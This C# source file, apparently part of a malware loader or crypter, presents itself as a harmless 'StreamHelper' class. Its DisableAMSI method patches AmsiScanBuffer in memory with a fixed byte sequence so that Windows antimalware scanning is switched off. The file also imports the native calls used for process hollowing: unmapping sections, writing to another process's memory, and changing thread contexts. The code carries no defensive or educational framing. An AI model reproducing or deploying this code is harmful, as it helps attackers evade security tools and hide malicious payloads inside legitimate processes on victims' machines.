using System;
using System.Runtime.InteropServices;
using dadyProcess;
using refresh;
using refreshamd;
using refreshstart;


namespace RefreshFN
{
    public class StreamHelper
    {
        public StreamHelper()
        {
        }

        public static IntPtr AllocateGlobalMemory(int size, int alignment)
        {
            IntPtr intPtr = Marshal.AllocHGlobal(size + alignment / 2);
            return new IntPtr((long)alignment * (((long)intPtr + (long)(alignment - 1)) / (long)alignment));
        }

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, ExactSpelling = false, SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, ExactSpelling = false, SetLastError = true)]
        public static extern unsafe bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, StartupInfo* lpStartupInfo, ProcessInfo* lpProcessInformation);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, ExactSpelling = false, SetLastError = true)]
        public static extern unsafe bool CreateProcessInternal(uint hToken, string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, StartupInfo* lpStartupInfo, ProcessInfo* lpProcessInfo, uint hNewToken);

        public static void DisableAMSI()
        {
            uint num;
            IntPtr procAddress = StreamHelper.GetProcAddress(StreamHelper.LoadLibrary("amsi.dll"), "AmsiScanBuffer");
            StreamHelper.VirtualProtect(procAddress, 5, 64, out num);
            Marshal.Copy(new byte[] { 184, 87, 0, 7, 128, 195 }, 0, procAddress, 6);
            StreamHelper.VirtualProtect(procAddress, 5, num, out num);
        }

        [DllImport("kernel32.dll", CharSet = CharSet.None, ExactSpelling = false)]
        public static extern IntPtr GetProcAddress(IntPtr lib, string name);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, ExactSpelling = false, SetLastError = true)]
        public static extern unsafe bool GetThreadContext(IntPtr hThread, _CONTEXT* pContext);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, ExactSpelling = false, SetLastError = true)]
        public static extern unsafe bool GetThreadContext(IntPtr hThread, _CONTEXT_AMD64* pContext);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, ExactSpelling = false, SetLastError = true)]
        public static extern bool IsWow64Process(IntPtr hProcess, ref bool isWow64);

        [DllImport("kernel32.dll", CharSet = CharSet.None, ExactSpelling = false)]
        public static extern IntPtr LoadLibrary(string name);

        [DllImport("ntdll.dll", CharSet = CharSet.Auto, ExactSpelling = false, SetLastError = true)]
        public static extern uint NtUnmapViewOfSection(IntPtr hProcess, IntPtr lpBaseAddress);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, ExactSpelling = false, SetLastError = true)]
        public static extern uint ResumeThread(IntPtr hThread);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, ExactSpelling = false, SetLastError = true)]
        public static extern unsafe bool SetThreadContext(IntPtr hThread, _CONTEXT* pContext);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, ExactSpelling = false, SetLastError = true)]
        public static extern unsafe bool SetThreadContext(IntPtr hThread, _CONTEXT_AMD64* pContext);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, ExactSpelling = false, SetLastError = true)]
        public static extern bool TerminateProcess(IntPtr hProcess, int exitCode);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, ExactSpelling = false, SetLastError = true)]
        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", CharSet = CharSet.None, ExactSpelling = false)]
        public static extern bool VirtualProtect(IntPtr address, uint size, uint flProtect, out uint flOld);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, ExactSpelling = false, SetLastError = true)]
        public static extern unsafe bool Wow64GetThreadContext(IntPtr hThread, _CONTEXT* pContext);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, ExactSpelling = false, SetLastError = true)]
        public static extern unsafe bool Wow64SetThreadContext(IntPtr hThread, _CONTEXT* pContext);

        [DllImport("kernel32.dll", CharSet = CharSet.None, ExactSpelling = false, SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, UIntPtr nSize, IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", CharSet = CharSet.None, ExactSpelling = false)]
        public static extern bool ZeroMemory(IntPtr address, UIntPtr size);
    }
}